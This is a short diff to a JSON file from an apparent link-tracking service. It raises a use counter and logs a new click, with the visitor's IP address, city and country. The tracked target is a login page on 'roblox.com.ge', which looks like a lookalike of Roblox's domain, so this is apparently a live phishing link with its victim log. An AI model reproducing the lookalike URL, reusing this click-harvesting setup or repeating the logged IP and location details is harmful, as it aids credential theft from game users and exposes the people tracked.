@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1631,
+    "useCount": 1632,
     "createdBy": "admin",
     "clicks": [
       {
@@ -13216,6 +13216,14 @@
         "city": "Kuching",
         "flag": "🇲🇾",
         "countryCode": "MY"
+      },
+      {
+        "timestamp": 1777550097131,
+        "ip": "85.76.39.231",
+        "country": "Finland",
+        "city": "Nivala",
+        "flag": "🇫🇮",
+        "countryCode": "FI"
       }
     ]
   },
